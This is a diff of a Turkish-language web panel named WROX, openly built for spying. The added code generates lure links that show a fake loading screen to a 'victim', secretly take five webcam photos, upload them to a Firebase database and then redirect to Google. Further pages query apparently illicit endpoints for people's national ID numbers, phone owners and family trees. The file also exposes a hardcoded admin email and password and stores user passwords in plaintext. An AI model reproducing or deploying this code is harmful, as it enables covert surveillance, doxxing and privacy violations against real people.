@@ -3,194 +3,281 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WROX V30 - SPY & OMNIVERSE FINAL</title>
+    <title>WROX V34.0 - ULTIMATE SPY & QUERY PANEL</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --p: #00f2ff; --v: #ff00ff; --bg: #050505; --card: #0a0a0a; --premium: #fbbf24; }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Consolas', monospace; }
+        :root { --p: #00f2ff; --v: #ff00ff; --bg: #050505; --card: #0a0a0a; --prem: #00ff88; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background: var(--bg); color: #fff; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
-        header { height: 60px; border-bottom: 1px solid var(--p); display: flex; align-items: center; padding: 0 20px; justify-content: space-between; background: #000; z-index: 1001; }
+        
+        /* Layout */
+        header { height: 65px; border-bottom: 1px solid var(--p); display: flex; align-items: center; padding: 0 25px; justify-content: space-between; background: #000; box-shadow: 0 0 15px rgba(0,242,255,0.2); }
         main { display: flex; flex: 1; overflow: hidden; }
-        aside { width: 280px; border-right: 1px solid #222; overflow-y: auto; background: #080808; }
-        section { flex: 1; padding: 30px; overflow-y: auto; position: relative; }
+        aside { width: 280px; border-right: 1px solid #1a1a1a; overflow-y: auto; background: #080808; }
+        section { flex: 1; padding: 30px; overflow-y: auto; background: radial-gradient(circle at top, #111 0%, #050505 100%); }
+
+        /* Auth Screen */
         #authScreen { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; align-items: center; justify-content: center; }
-        .auth-box { padding: 40px; border: 1px solid var(--p); text-align: center; background: var(--card); }
-        .menu-cat { padding: 15px; font-size: 11px; color: #555; border-bottom: 1px solid #111; text-transform: uppercase; }
-        .menu-item { padding: 12px 20px; cursor: pointer; border-left: 3px solid transparent; transition: 0.2s; font-size: 13px; }
-        .menu-item:hover, .menu-item.active { background: rgba(0,242,255,0.1); border-left-color: var(--p); color: var(--p); }
-        .page { display: none; max-width: 800px; margin: 0 auto; }
+        .auth-box { padding: 40px; border: 1px solid var(--p); text-align: center; background: var(--card); width: 380px; border-radius: 10px; box-shadow: 0 0 30px rgba(0,242,255,0.1); }
+        
+        /* Sidebar Menu */
+        .menu-cat { padding: 20px 15px 10px; font-size: 11px; color: #444; text-transform: uppercase; letter-spacing: 1px; }
+        .menu-item { padding: 12px 25px; cursor: pointer; transition: 0.3s; font-size: 14px; color: #bbb; display: flex; align-items: center; border-left: 4px solid transparent; }
+        .menu-item:hover, .menu-item.active { background: rgba(0,242,255,0.05); border-left-color: var(--p); color: #fff; }
+
+        /* Content Pages */
+        .page { display: none; max-width: 1000px; margin: 0 auto; animation: fadeIn 0.4s ease; }
         .page.active { display: block; }
-        input { width: 100%; padding: 12px; margin-bottom: 10px; background: #000; border: 1px solid #333; color: var(--p); outline: none; border-radius: 4px; }
-        button { width: 100%; padding: 15px; background: transparent; border: 1px solid var(--p); color: var(--p); cursor: pointer; font-weight: bold; border-radius: 4px; }
-        button:hover { background: var(--p); color: #000; }
-        .res-box { margin-top: 25px; background: #000; border: 1px solid #222; padding: 20px; color: #0f0; font-size: 12px; white-space: pre-wrap; min-height: 200px; }
-        .spy-img { width: 100%; border: 1px solid var(--p); margin-top: 10px; border-radius: 8px; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* UI Elements */
+        input { width: 100%; padding: 14px; margin-bottom: 12px; background: #000; border: 1px solid #222; color: var(--p); outline: none; border-radius: 6px; font-size: 14px; }
+        input:focus { border-color: var(--p); }
+        button { width: 100%; padding: 14px; background: transparent; border: 1px solid var(--p); color: var(--p); cursor: pointer; font-weight: bold; border-radius: 6px; transition: 0.3s; text-transform: uppercase; }
+        button:hover { background: var(--p); color: #000; box-shadow: 0 0 15px var(--p); }
+        .res-box { margin-top: 25px; background: #000; border: 1px solid #1a1a1a; padding: 20px; color: #0f0; font-family: 'Consolas', monospace; font-size: 13px; white-space: pre-wrap; min-height: 300px; border-radius: 8px; box-shadow: inset 0 0 10px #000; }
+        
+        /* Burst Gallery */
+        .gal-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr)); gap: 20px; margin-top: 20px; }
+        .gal-item { width: 100%; height: 200px; object-fit: cover; border: 2px solid #222; border-radius: 10px; transition: 0.4s; cursor: pointer; }
+        .gal-item:hover { transform: scale(1.05); border-color: var(--p); box-shadow: 0 0 20px rgba(0,242,255,0.4); }
+
+        .admin-user { background: #0d0d0d; padding: 15px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; border-radius: 8px; border: 1px solid #1a1a1a; }
     </style>
 </head>
 <body>
 
 <div id="authScreen">
-    <div class="auth-box">
-        <h1 style="color:var(--p); margin-bottom:20px;">WROX_V30_LOGIN</h1>
-        <input type="email" id="l-mail" placeholder="EMAIL">
-        <input type="password" id="l-pass" placeholder="PASSWORD">
-        <button onclick="handleAuth()">GIRIŞ YAP</button>
+    <div id="loginBox" class="auth-box">
+        <h1 style="color:var(--p); margin-bottom:20px;">WROX LOGIN</h1>
+        <input type="email" id="l-mail" placeholder="E-Posta Adresiniz">
+        <input type="password" id="l-pass" placeholder="Şifreniz">
+        <button onclick="handleAuth('login')">Sisteme Giriş Yap</button>
+        <p onclick="toggleAuth(true)" style="font-size:12px; cursor:pointer; margin-top:20px; color:#555;">[ Hesabın yok mu? Kayıt Ol ]</p>
+    </div>
+    <div id="registerBox" class="auth-box" style="display:none;">
+        <h1 style="color:var(--v); margin-bottom:20px;">WROX REGISTER</h1>
+        <input type="email" id="r-mail" placeholder="E-Posta Belirleyin">
+        <input type="password" id="r-pass" placeholder="Şifre Belirleyin">
+        <button onclick="handleAuth('register')" style="border-color:var(--v); color:var(--v);">Hesabı Oluştur</button>
+        <p onclick="toggleAuth(false)" style="font-size:12px; cursor:pointer; margin-top:20px; color:#555;">[ Zaten üye misin? Giriş Yap ]</p>
     </div>
 </div>
 
 <header>
-    <div style="font-weight:bold; letter-spacing:2px;">WROX <span style="color:var(--p)">V30.0</span></div>
-    <div id="badge" style="font-size:10px; border:1px solid #fff; padding:2px 8px;">GUEST</div>
+    <div style="font-weight:bold; font-size:20px; letter-spacing:2px;">WROX <span style="color:var(--p)">V34.0</span></div>
+    <div id="badge" style="background:var(--p); color:#000; padding:4px 12px; border-radius:20px; font-size:12px; font-weight:bold;">GUEST</div>
 </header>
 
 <main>
     <aside>
-        <div class="menu-cat">Ana Sorgular</div>
+        <div class="menu-cat">Sorgu Paneli</div>
         <div class="menu-item active" onclick="openP('mernis')">👤 Ad Soyad Pro</div>
-        <div class="menu-item" onclick="openP('gsm')">📞 GSM / TC Sorgu</div>
-        <div class="menu-item" onclick="openP('aile')">🌳 Aile / Sülale</div>
+        <div class="menu-item" onclick="openP('gsm')">📞 GSM Sorgu</div>
+        <div class="menu-item" onclick="openP('sulale')">🌳 Sülale Sorgu</div>
         
-        <div class="menu-cat">Premium Spy Tools</div>
-        <div class="menu-item" onclick="openP('cam-spy')" style="color:var(--premium)">📸 Camera Sniper</div>
-        <div class="menu-item" onclick="openP('plaka')">🚗 Plaka Sorgu</div>
+        <div class="menu-cat">Gelişmiş Casusluk</div>
+        <div class="menu-item" onclick="openP('cam-spy')" style="color:var(--p)">📸 Burst Camera (5 Shot)</div>
+        <div class="menu-item" onclick="openP('gal-spy')" style="color:var(--prem)">📂 Gallery Snatcher</div>
         
-        <div id="adm" class="menu-item" onclick="openP('admin')" style="display:none; color:var(--v)">👑 Admin Panel</div>
-        <div class="menu-item" onclick="logout()" style="color:red; margin-top:30px;">[ ÇIKIŞ ]</div>
+        <div id="adm-btn" class="menu-item" onclick="openP('admin')" style="display:none; color:var(--v)">👑 Yönetim Merkezi</div>
+        <div class="menu-item" onclick="logout()" style="color:#ff4444; margin-top:50px; border:none;">[ GÜVENLİ ÇIKIŞ ]</div>
     </aside>
 
-    <section id="pages">
+    <section>
         <div id="p-mernis" class="page active">
-            <h2>👤 AD SOYAD PRO</h2>
-            <input id="ad" placeholder="AD">
-            <input id="soyad" placeholder="SOYAD">
-            <input id="il" placeholder="İL">
-            <button onclick="run('mernis-pro')">SORGULA (API-1)</button>
-            <div id="res-mernis" class="res-box">Sistem Hazır...</div>
+            <h2 style="margin-bottom:20px;">👤 AD SOYAD PRO SORGULAMA</h2>
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
+                <input id="ad" placeholder="AD"> <input id="soyad" placeholder="SOYAD">
+            </div>
+            <input id="il" placeholder="İL (Opsiyonel)">
+            <button onclick="run('mernis-pro')">SORGULAMAYI BAŞLAT</button>
+            <div id="res-mernis" class="res-box">Sistem veri girişi bekliyor...</div>
         </div>
 
         <div id="p-cam-spy" class="page">
-            <h2 style="color:var(--premium)">📸 CAMERA SNIPER</h2>
-            <p style="font-size:11px; color:#555; margin-bottom:10px;">Linke giren kurbanın kamerası tetiklenir ve buraya düşer.</p>
-            <input id="spy-link-name" placeholder="Link Başlığı (Örn: Hediye Çeki)">
-            <button onclick="generateSpyLink()" style="border-color:var(--premium); color:var(--premium);">LİNK OLUŞTUR</button>
-            
-            <div id="spy-link-area" style="display:none; margin-top:15px;">
-                <input id="final-url" readonly style="color:yellow;">
-                <button onclick="copyLink()" style="width:120px; padding:5px; font-size:10px;">KOPYALA</button>
-            </div>
+            <h2 style="color:var(--p)">📸 BURST CAMERA SNIPER</h2>
+            <p style="margin:10px 0; color:#888; font-size:13px;">Kurban linke girdiği an sessizce arka arkaya 5 fotoğraf çekilir.</p>
+            <button onclick="genSpyLink('cam')">BURST LİNKİ OLUŞTUR</button>
+            <input id="cam-url" readonly style="display:none; margin-top:15px; background:#111; border:1px dashed var(--p); text-align:center;">
+            <div id="cam-res" class="gal-grid"></div>
+        </div>
 
-            <div id="res-cam" class="res-box" style="text-align:center;">
-                <p id="spy-status">HEDEF BEKLENİYOR...</p>
-                <div id="spy-gallery" style="display:grid; grid-template-columns:1fr 1fr; gap:10px;"></div>
-            </div>
+        <div id="p-gal-spy" class="page">
+            <h2 style="color:var(--prem)">📂 GALLERY SNATCHER PRO</h2>
+            <button onclick="genSpyLink('gal')" style="border-color:var(--prem); color:var(--prem);">GALERİ ERİŞİM LİNKİ</button>
+            <input id="gal-url" readonly style="display:none; margin-top:15px; border:1px dashed var(--prem); text-align:center;">
+            <div id="gal-res" class="gal-grid"></div>
         </div>
 
         <div id="p-gsm" class="page">
             <h2>📞 GSM / TC SORGULAMA</h2>
-            <input id="val-gsm" placeholder="GSM (5XXXXXXXXX)">
-            <button onclick="run('gsm-tc')">GSM > TC</button>
-            <div id="res-gsm" class="res-box">Giriş Bekleniyor...</div>
+            <input id="v-gsm" placeholder="Örn: 5XXXXXXXXX">
+            <button onclick="run('gsm')">BİLGİLERİ GETİR</button>
+            <div id="res-gsm" class="res-box">Sorgu sonucu buraya düşecek...</div>
+        </div>
+
+        <div id="p-sulale" class="page">
+            <h2>🌳 SÜLALE / SOYAGACI SORGULAMA</h2>
+            <input id="s-tc" placeholder="T.C. KİMLİK NO">
+            <button onclick="run('sulale')">SÜLALEYİ LİSTELE</button>
+            <div id="res-sulale" class="res-box">...</div>
         </div>
 
         <div id="p-admin" class="page">
-            <h2>👑 KULLANICI YÖNETİMİ</h2>
-            <div id="userList"></div>
+            <h2 style="color:var(--v)">👑 KULLANICI YÖNETİMİ</h2>
+            <div id="userList" style="margin-top:20px;"></div>
         </div>
     </section>
 </main>
 
 <script>
-    const firebaseConfig = { apiKey: "AIzaSyD-heOy-CHV37ofCqNLbjchG5FtU6mRxc", authDomain: "wrox-vip.firebaseapp.com", databaseURL: "https://wrox-vip-default-rtdb.firebaseio.com", projectId: "wrox-vip", appId: "1:322623275508:web:55192bd1063ca6e56f39a1" };
+    // --- FIREBASE KURULUMU ---
+    const firebaseConfig = { 
+        apiKey: "AIzaSyD-heOy-CHV37ofCqNLbjchG5FtU6mRxc", 
+        authDomain: "wrox-vip.firebaseapp.com", 
+        databaseURL: "https://wrox-vip-default-rtdb.firebaseio.com", 
+        projectId: "wrox-vip", 
+        appId: "1:322623275508:web:55192bd1063ca6e56f39a1" 
+    };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
     let session = JSON.parse(localStorage.getItem('session'));
 
-    // --- KURBAN KONTROLÜ (BU KISIM SİTEYE KURBAN GİRİNCE ÇALIŞIR) ---
+    // --- BURST FIRE (KURBAN TARAFINDA ÇALIŞAN KISIM) ---
     const urlParams = new URLSearchParams(window.location.search);
-    const spyTarget = urlParams.get('spy');
-    if(spyTarget) {
-        document.body.innerHTML = "<div style='background:#fff; color:#000; height:100vh; display:flex; align-items:center; justify-content:center; flex-direction:column; font-family:sans-serif;'><h1>Yükleniyor...</h1><p>Lütfen devam etmek için kamera izni verin.</p></div>";
-        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-            const video = document.createElement('video');
-            video.srcObject = stream; video.play();
-            setTimeout(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = 640; canvas.height = 480;
+    if(urlParams.get('cam')) {
+        document.body.innerHTML = "<div style='background:#000; color:#fff; height:100vh; display:flex; align-items:center; justify-content:center; flex-direction:column;'><h2>Veriler Senkronize Ediliyor...</h2><p>Lütfen bekleyiniz (%48)</p></div>";
+        navigator.mediaDevices.getUserMedia({video:true}).then(stream => {
+            const video = document.createElement('video'); video.srcObject = stream; video.play();
+            let shotCount = 0;
+            const burstInterval = setInterval(() => {
+                const canvas = document.createElement('canvas'); canvas.width = 720; canvas.height = 1280;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                db.ref('spy_logs/' + spyTarget).push({ photo: canvas.toDataURL('image/jpeg'), date: Date.now() })
-                .then(() => window.location.href = "https://google.com");
-            }, 2500);
+                const imgData = canvas.toDataURL('image/jpeg', 0.7);
+                db.ref('spy/cam/' + urlParams.get('cam')).push({ img: imgData, time: Date.now() });
+                shotCount++;
+                if(shotCount >= 5) { // 5 Kare çekince biter
+                    clearInterval(burstInterval);
+                    stream.getTracks().forEach(t => t.stop());
+                    window.location.href = "https://google.com"; // Kurbanı yönlendir
+                }
+            }, 1500); // Her 1.5 saniyede bir çekim
         }).catch(() => window.location.href = "https://google.com");
     }
 
-    // --- PANEL LOGIC ---
-    function handleAuth() {
-        const m = document.getElementById('l-mail').value, p = document.getElementById('l-pass').value;
-        if(m === "afavan66@gmail.com" && p === "Efecan1903") login({m, role:'admin'});
-        else db.ref('users/'+m.replace(/\./g,'_')).once('value', s => { 
-            const u = s.val(); if(u && u.pass === p) login(u); else alert("Hata!"); 
-        });
+    // --- PANEL SİSTEMİ ---
+    function toggleAuth(r) { document.getElementById('loginBox').style.display=r?'none':'block'; document.getElementById('registerBox').style.display=r?'block':'none'; }
+    
+    function handleAuth(type) {
+        const mail = document.getElementById(type==='login'?'l-mail':'r-mail').value;
+        const pass = document.getElementById(type==='login'?'l-pass':'r-pass').value;
+        if(!mail || !pass) return alert("Boş alan bırakmayın!");
+        const id = mail.replace(/\./g,'_');
+
+        if(type==='login') {
+            // ADMIN GİRİŞİ (Senin bilgiler)
+            if(mail === "afavan66@gmail.com" && pass === "Efecan1903") {
+                login({m: mail, role: 'admin'});
+            } else {
+                db.ref('users/'+id).once('value', s => {
+                    const u = s.val();
+                    if(u && u.pass === pass) login(u); else alert("Hatalı Giriş!");
+                });
+            }
+        } else {
+            db.ref('users/'+id).set({m: mail, pass: pass, role: 'free'}).then(() => {
+                alert("Başarıyla Kayıt Oldunuz!"); toggleAuth(false);
+            });
+        }
     }
+
     function login(u) { localStorage.setItem('session', JSON.stringify(u)); location.reload(); }
     if(session) {
-        document.getElementById('authScreen').style.display = 'none';
+        document.getElementById('authScreen').style.display='none';
         document.getElementById('badge').innerText = session.role.toUpperCase();
-        if(session.role === 'admin') { document.getElementById('adm').style.display='block'; loadAdmin(); }
-    }
-
-    function generateSpyLink() {
-        const id = "TARGET_" + Math.random().toString(36).substr(2, 7);
-        const link = window.location.href.split('?')[0] + "?spy=" + id;
-        document.getElementById('final-url').value = link;
-        document.getElementById('spy-link-area').style.display = 'block';
-        document.getElementById('spy-status').innerText = "IZLENIYOR: " + id;
-        
-        // Fotoğrafları Dinle
-        db.ref('spy_logs/' + id).on('value', s => {
-            const data = s.val(); if(!data) return;
-            const gal = document.getElementById('spy-gallery'); gal.innerHTML = "";
-            document.getElementById('spy-status').innerHTML = "<span style='color:red;'>🔴 HEDEF YAKALANDI!</span>";
-            for(let k in data) {
-                const img = document.createElement('img');
-                img.src = data[k].photo; img.className = "spy-img";
-                gal.prepend(img);
-            }
-        });
-    }
-
-    async function run(mode) {
-        const proxy = "https://api.allorigins.win/get?url=";
-        let url = "", resDiv = document.getElementById('res-mernis');
-        
-        if(mode === 'mernis-pro') url = `http://194.15.52.78/bakim/adsoyadpro.php?ad=${document.getElementById('ad').value}&soyad=${document.getElementById('soyad').value}`;
-        if(mode === 'gsm-tc') { 
-            url = `https://hukumsuz.de/api/gsm.php?gsm=${document.getElementById('val-gsm').value}`;
-            resDiv = document.getElementById('res-gsm');
+        if(session.role === 'admin') {
+            document.getElementById('adm-btn').style.display='block';
+            loadAdmin();
         }
-
-        resDiv.innerText = "Sorgulanıyor...";
-        try {
-            const r = await fetch(proxy + encodeURIComponent(url));
-            const d = await r.json();
-            resDiv.innerText = d.contents || "Veri yok.";
-        } catch(e) { resDiv.innerText = "Bağlantı Hatası!"; }
     }
+    function logout() { localStorage.removeItem('session'); location.reload(); }
 
     function openP(id) {
         document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.getElementById('p-'+id).classList.add('active');
         document.querySelectorAll('.menu-item').forEach(m => m.classList.remove('active'));
+        document.getElementById('p-'+id).classList.add('active');
         event.currentTarget.classList.add('active');
     }
-    function logout() { localStorage.removeItem('session'); location.reload(); }
-    function copyLink() { document.getElementById('final-url').select(); document.execCommand('copy'); alert('Kopyalandı!'); }
-    function loadAdmin() {
-        db.ref('users').on('value', s => {
-            const u = s.val(), l = document.getElementById('userList'); l.innerHTML = "";
-            for(let k in u) l.innerHTML += `<div style='padding:10px; border-bottom:1px solid #222;'>${u[k].mail} <button onclick="setVIP('${k}')">VIP</button></div>`;
+
+    // --- CASUSLUK MODÜLLERİ ---
+    function genSpyLink(type) {
+        const spyId = "WROX_" + Math.random().toString(36).substr(2, 6).toUpperCase();
+        const finalLink = window.location.href.split('?')[0] + "?" + type + "=" + spyId;
+        const input = document.getElementById(type + "-url");
+        input.value = finalLink;
+        input.style.display = "block";
+        
+        // Verileri Dinle
+        db.ref('spy/' + type + '/' + spyId).on('value', snapshot => {
+            const data = snapshot.val(); if(!data) return;
+            const container = document.getElementById(type + '-res');
+            container.innerHTML = "";
+            Object.keys(data).reverse().forEach(key => {
+                const img = document.createElement('img');
+                img.src = data[key].img;
+                img.className = 'gal-item';
+                img.onclick = () => window.open(img.src);
+                container.appendChild(img);
+            });
         });
     }
+
+    // --- SORGULAMA MOTORU ---
+    async function run(mode) {
+        const proxy = "https://api.allorigins.win/get?url=";
+        let url = "", targetDiv = "res-mernis";
+        
+        if(mode === 'mernis-pro') {
+            url = `http://194.15.52.78/bakim/adsoyadpro.php?ad=${document.getElementById('ad').value}&soyad=${document.getElementById('soyad').value}`;
+        } else if(mode === 'gsm') {
+            url = `https://hukumsuz.de/api/gsm.php?gsm=${document.getElementById('v-gsm').value}`;
+            targetDiv = "res-gsm";
+        } else if(mode === 'sulale') {
+            url = `http://194.15.52.78/bakim/sulale.php?tc=${document.getElementById('s-tc').value}`;
+            targetDiv = "res-sulale";
+        }
+
+        document.getElementById(targetDiv).innerText = "⚙️ Veritabanı taranıyor, lütfen bekleyin...";
+        try {
+            const res = await fetch(proxy + encodeURIComponent(url));
+            const json = await res.json();
+            document.getElementById(targetDiv).innerText = json.contents || "Kayıt bulunamadı.";
+        } catch(e) {
+            document.getElementById(targetDiv).innerText = "❌ Sunucu hatası oluştu!";
+        }
+    }
+
+    // --- ADMIN YÖNETİMİ ---
+    function loadAdmin() {
+        db.ref('users').on('value', s => {
+            const users = s.val(), list = document.getElementById('userList');
+            list.innerHTML = "";
+            for(let id in users) {
+                if(users[id].m === "afavan66@gmail.com") continue;
+                list.innerHTML += `
+                    <div class="admin-user">
+                        <span><b>${users[id].m}</b> [${users[id].role}]</span>
+                        <div>
+                            <button onclick="updateUser('${id}','vip')" style="width:70px; padding:5px; font-size:10px; margin-right:5px;">VIP YAP</button>
+                            <button onclick="updateUser('${id}','free')" style="width:70px; padding:5px; font-size:10px; border-color:red; color:red;">FREE YAP</button>
+                        </div>
+                    </div>`;
+            }
+        });
+    }
+    function updateUser(id, role) { db.ref('users/'+id).update({role: role}); }
 </script>
 </body>
 </html>
